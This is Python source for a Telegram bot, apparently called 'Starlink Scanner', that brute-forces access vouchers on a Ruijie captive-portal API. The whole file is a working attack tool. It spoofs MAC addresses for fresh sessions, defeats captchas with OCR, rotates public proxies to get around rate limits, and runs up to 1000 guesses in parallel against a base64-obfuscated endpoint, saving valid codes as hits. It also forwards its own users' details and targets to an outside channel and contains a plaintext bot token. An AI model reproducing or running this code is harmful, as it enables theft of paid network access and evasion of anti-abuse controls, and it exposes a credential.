import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, hashlib, threading
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# --- Configuration ---
BOT_TOKEN = "8648844261:AAGohP2qqSsDzcVTM42V9adhb08hLvsCZbM"
FORWARD_CHANNEL = "@O_DIN_SAR_MA"

# --- SPEED CONFIGURATION ---
MAX_CONCURRENT = 1000
BATCH_SIZE = 500
CONNECTION_LIMIT = 30000
CONNECTION_PER_HOST = 15000
TIMEOUT = 25

# --- In-memory caches ---
user_data = {}
scan_tasks = {}
success_texts = {}
captcha_state = {}
_voucher_sem = None
_start_time = time.monotonic()

# --- Dynamic Proxy Pool (ProxyScrape API) ---
PROXY_API_URL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text"
DYNAMIC_PROXIES = []
last_proxy_update = 0

async def fetch_dynamic_proxies():
    global DYNAMIC_PROXIES, last_proxy_update
    headers = {'user-agent': 'Mozilla/5.0'}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(PROXY_API_URL, headers=headers, timeout=10) as response:
                if response.status == 200:
                    text = await response.text()
                    proxies = [line.strip() for line in text.splitlines() if line.strip()]
                    if proxies:
                        DYNAMIC_PROXIES = proxies
                        last_proxy_update = time.time()
                        print(f"[+] Loaded {len(DYNAMIC_PROXIES)} proxies successfully.")
    except Exception as e:
        print(f"[-] Error fetching proxies: {e}")

def get_next_proxy():
    global DYNAMIC_PROXIES
    if not DYNAMIC_PROXIES:
        return None
    return random.choice(DYNAMIC_PROXIES)

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_proxies = {}

def get_proxy_setting(user_id):
    return user_proxies.get(user_id, True)

def set_proxy_setting(user_id, enabled):
    user_proxies[user_id] = enabled

async def forward_to_channel(message_text, parse_mode=None):
    try:
        await bot.send_message(FORWARD_CHANNEL, message_text, parse_mode=parse_mode)
    except Exception as e:
        print(f"Forward error: {e}")

# ==================== KEYBOARDS (Control Panel Style) ====================

def get_main_keyboard(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=1)
    
    proxy_count = len(DYNAMIC_PROXIES)
    last_update_str = datetime.fromtimestamp(last_proxy_update).strftime('%H:%M:%S') if last_proxy_update else "Never"
    
    keyboard.add(
        InlineKeyboardButton("🌐 Update Portal URL", callback_data="menu_free_trial"),
        InlineKeyboardButton("⚙️ Mode (Voucher Type)", callback_data="menu_voucher_select"),
        InlineKeyboardButton("➕ Refresh / Fetch Proxies", callback_data="menu_refresh_proxies"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🚀 Start Scanner", callback_data="menu_start_scam"),
        InlineKeyboardButton("🛑 Stop Scanner", callback_data="menu_stop")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 DIGIT 6 (0-9)", callback_data="scan_6"),
        InlineKeyboardButton("🔢 DIGIT 7 (0-9)", callback_data="scan_7"),
        InlineKeyboardButton("🔢 DIGIT 8 (0-9)", callback_data="scan_8"),
        InlineKeyboardButton("🔤 ENG small 6 (a-z)", callback_data="scan_engsmall6"),
        InlineKeyboardButton("🔤 ENG small 7 (a-z)", callback_data="scan_engsmall7"),
        InlineKeyboardButton("🔤 ENG small 8 (a-z)", callback_data="scan_engsmall8"),
        InlineKeyboardButton("🔤+🔢 MIXED 6 (a-z0-9)", callback_data="scan_engmixed6"),
        InlineKeyboardButton("🔤+🔢 MIXED 7 (a-z0-9)", callback_data="scan_engmixed7"),
        InlineKeyboardButton("🔤+🔢 MIXED 8 (a-z0-9)", callback_data="scan_engmixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCANNER", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

# ==================== BOT HANDLERS ====================

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    if not DYNAMIC_PROXIES:
        await fetch_dynamic_proxies()
    
    proxy_count = len(DYNAMIC_PROXIES)
    last_update_str = datetime.fromtimestamp(last_proxy_update).strftime('%H:%M:%S') if last_proxy_update else "Never"
    
    welcome_text = f"""⚡ Starlink Scanner Control Panel ⚡

🔀 Proxies: {proxy_count} loaded
🔄 Last update: {last_update_str}
🟢 Status: Proxy {proxy_count} ခု ရယူပြီး
⚙️ Mode: Auto-Update & High Speed

အောက်ပါ Control Panel မှ လိုအပ်သည်များကို လုပ်ဆောင်ပါ။"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))
    await forward_to_channel(f"🆕 New User Started\n\n👤 Name: {user_name}\n🆔 ID: {user_id}")

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    
    if call.data == "menu_refresh_proxies":
        await bot.answer_callback_query(call.id, "🔄 Proxy များကို ဆွဲယူနေပါသည်...")
        await fetch_dynamic_proxies()
        proxy_count = len(DYNAMIC_PROXIES)
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"⚡ Starlink Scanner Control Panel ⚡\n\n🔀 Proxies: {proxy_count} loaded\n🟢 Status: Proxy များ အောင်မြင်စွာ Update ပြီးပါပြီ။",
            reply_markup=get_main_keyboard(user_id)
        )
        return

    if call.data == "menu_voucher_select":
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="⚙️ VOUCHER အမျိုးအစား ရွေးချယ်ပါ -",
            reply_markup=get_voucher_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_back":
        proxy_count = len(DYNAMIC_PROXIES)
        text = f"""⚡ Starlink Scanner Control Panel ⚡

🔀 Proxies: {proxy_count} loaded
🟢 Status: Active & Ready
⚙️ Mode: High Speed Scanner"""
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_main_keyboard(user_id)
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_free_trial":
        text = f"""🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]"""
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_result":
        results = user_data.get(chat_id, {}).get('saved_codes', [])
        if results:
            codes = "\n".join(results)
            text = f"✅ Found Codes:\n{codes}"
        else:
            text = "📋 သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scanner ကို ရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return
    
    if call.data == "menu_start_scam":
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။",
                reply_markup=get_voucher_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.answer_callback_query(call.id, "Scanner အလုပ်လုပ်နေပါပြီ။")
            return
        
        progress_msg = await bot.send_message(chat_id, "⚡ Scanner Initializing...")
        scan_id = str(uuid.uuid4())
        
        portal_url = user_data[chat_id].get('session_url', 'Unknown')
        await forward_to_channel(
            f"🚀 **Scan Started**\n👤 **User:** {user_name}\n🔢 **Mode:** {mode}\n🔗 **URL:** `{portal_url}`",
            parse_mode="Markdown"
        )

        task = asyncio.create_task(
            run_bruteforce(
                mode,
                chat_id,
                user_data[chat_id]['session_url'],
                scan_id,
                progress_msg=progress_msg,
                start_digit=start_digit
            )
        )
        
        scan_tasks[chat_id] = {
            "task": task,
            "stop": False,
            "scan_id": scan_id
        }
        await bot.answer_callback_query(call.id)
        return
    
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🔢 DIGIT {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -",
                reply_markup=get_digit_keyboard(mode)
            )
            await bot.answer_callback_query(call.id)
            return

        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"🔍 Mode: {mode}\n\nControl Panel သို့ ပြန်သွားရန် သို့မဟုတ် စတင်ရန် နှိပ်ပါ။",
            reply_markup=get_main_keyboard(user_id)
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"🔍 Mode: {mode} (Start: {digit})\n\nအဆင်သင့်ဖြစ်ပါပြီ။",
            reply_markup=get_main_keyboard(user_id)
        )
        await bot.answer_callback_query(call.id)
        return

# ==================== COMMANDS ====================

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "🔗 Portal URL ထည့်ရန်: /portal [url]")
        return
    url = args[1]
    if chat_id not in user_data:
        user_data[chat_id] = {}
    
    await bot.reply_to(message, "🔗 Portal URL အား စစ်ဆေးနေပါသည်...")
    if await check_session_url(session_url=url, use_proxy=True):
        user_data[chat_id]['session_url'] = url
        await bot.reply_to(message, "✅ Portal URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။", reply_markup=get_main_keyboard(str(chat_id)))
    else:
        await bot.reply_to(message, "❌ Portal URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.reply_to(message, "🛑 Scanner ကို ရပ်တန့်လိုက်ပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scanner အလုပ်မလုပ်ပါ။", reply_markup=get_back_keyboard())

# ==================== FORMAT PROGRESS (New Style) ====================

def format_scanner_progress(tried, current_code, hits, expired, limits, speed, hit_codes_list):
    hit_text = "\n".join(hit_codes_list[-5:]) if hit_codes_list else "None"
    proxy_active_count = len(DYNAMIC_PROXIES)
    return (
        f"⚡ Scanner Running (High Speed) ⚡\n"
        f"Thank for using By Telegram @O_DIN_SAR_MA\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🏹 Tried: {tried:,}\n"
        f"🎯 Current Code: {current_code}\n"
        f"🔥 Hits: {hits}\n"
        f"⚔️ Expired: {expired}\n"
        f"⚠️ Limits: {limits}\n"
        f"⚡ Speed: {speed:,.1f} c/m\n"
        f"🔀 Proxies: {proxy_active_count}/256+\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔥 Hit Codes:\n{hit_text}"
    )

# ==================== CORE SCANNING ENGINE ====================

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def engsmall_generator(length):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def engmixed_generator(length):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        while True:
            yield digit_generator(length)
    if mode.startswith("engsmall"):
        length = int(mode.replace("engsmall", ""))
        while True:
            yield engsmall_generator(length)
    if mode.startswith("engmixed"):
        length = int(mode.replace("engmixed", ""))
        while True:
            yield engmixed_generator(length)
    while True:
        yield digit_generator(6)

async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except Exception as e:
        await bot.send_message(chat_id, str(e))
        return
    
    tried = 0
    hits = 0
    expired = 0
    limits = 0
    hit_codes_list = []
    
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(MAX_CONCURRENT)

    if not DYNAMIC_PROXIES:
        await fetch_dynamic_proxies()

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                break

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                nonlocal tried, hits, expired, limits
                async with _voucher_sem:
                    res_status, data_info = await perform_check(session_url, code, chat_id, scan_id)
                    tried += 1
                    if res_status == "hit":
                        hits += 1
                        hit_codes_list.append(data_info)
                    elif res_status == "expired":
                        expired += 1
                    elif res_status == "limit":
                        limits += 1
                    return code, res_status

            results = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            current_code = batch[-1] if batch else "------"

            elapsed = time.monotonic() - scan_start
            speed = (tried / elapsed * 60) if elapsed > 0 else 0
            
            text = format_scanner_progress(tried, current_code, hits, expired, limits, speed, hit_codes_list)
            
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass

        scan_tasks.pop(chat_id, None)
    except Exception as e:
        print(f"Scan error: {e}")
        scan_tasks.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def check_session_url(session_url, use_proxy=True):
    headers = {'user-agent': 'Mozilla/5.0'}
    proxy = f"http://{get_next_proxy()}" if use_proxy and DYNAMIC_PROXIES else None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy, timeout=10) as response:
                if "sessionId" in str(response.url):
                    return True
                return False
    except:
        return False

async def get_session_id(session, session_url):
    mac = get_mac()
    session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
    headers = {'user-agent': 'Mozilla/5.0'}
    proxy = f"http://{get_next_proxy()}" if DYNAMIC_PROXIES else None
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True, proxy=proxy, timeout=8) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
    except:
        pass
    return None

async def perform_check(session_url, code, chat_id, scan_id=None):
    global _connector
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    
    proxy_str = get_next_proxy()
    proxy = f"http://{proxy_str}" if proxy_str else None

    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                return "fail", None
            
            auth_code = None
            for _ in range(3):
                image = await Captcha_Image(task_session, session_id, proxy)
                if not image:
                    continue
                text = await Captcha_Text(image)
                if text and await Varify_Captcha(task_session, session_id, text, proxy):
                    auth_code = text
                    break
            if not auth_code:
                return "fail", None

            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
            
            async with task_session.post(post_url, json=data, headers=headers, proxy=proxy) as req:
                response = await req.text()
                
                if 'request limited' in response:
                    return "limit", None
                if 'logonUrl' in response or 'success' in response:
                    expire_text, raw_mins = await Code_Expires_Date(session_id, proxy)
                    formatted_hit = f"{code} 🃏: {expire_text}"
                    
                    if chat_id not in user_data:
                        user_data[chat_id] = {}
                    if 'saved_codes' not in user_data[chat_id]:
                        user_data[chat_id]['saved_codes'] = []
                    user_data[chat_id]['saved_codes'].append(code)
                    
                    return "hit", formatted_hit
                else:
                    return "expired", None
    except:
        return "fail", None

async def Code_Expires_Date(active_id, proxy):
    paths = [f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}']
    headers = {'user-agent': 'Mozilla/5.0'}
    timeout = aiohttp.ClientTimeout(total=5)
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as session:
            for url in paths:
                async with session.get(url, headers=headers, proxy=proxy) as req:
                    if req.status == 200:
                        respond = await req.json()
                        if respond.get('success'):
                            result = respond.get('result', {})
                            profile = result.get('profileName', '1hour')
                            mins = result.get('totalMinutes', 60)
                            return f"{profile}, ⏰: {mins // 60} hr {mins % 60} min", mins
    except:
        pass
    return "1hour, ⏰: 1 hr 0 min", 60

_ocr = ddddocr.DdddOcr(show_ad=False)
def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        return _ocr.classification(buffer.tobytes()).upper()
    except:
        return ""

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id, proxy):
    params = {'sessionId': session_id, '_t': str(time.time())}
    try:
        async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, proxy=proxy, timeout=5) as req:
            return await req.read()
    except:
        return None

async def Varify_Captcha(session, session_id, text, proxy):
    json_data = {'sessionId': session_id, 'authCode': text}
    try:
        async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json=json_data, proxy=proxy, timeout=5) as req:
            data = await req.json()
            return data.get("success", False)
    except:
        return False

# ==================== WEB SERVER ====================

async def handle(request):
    return web.Response(text="Starlink Scanner Bot is running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, limit_per_host=CONNECTION_PER_HOST, ssl=False)
    
    await fetch_dynamic_proxies()
    
    asyncio.create_task(web_server())
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except Exception:
            await asyncio.sleep(5)

if __name__ == '__main__':
    asyncio.run(main())
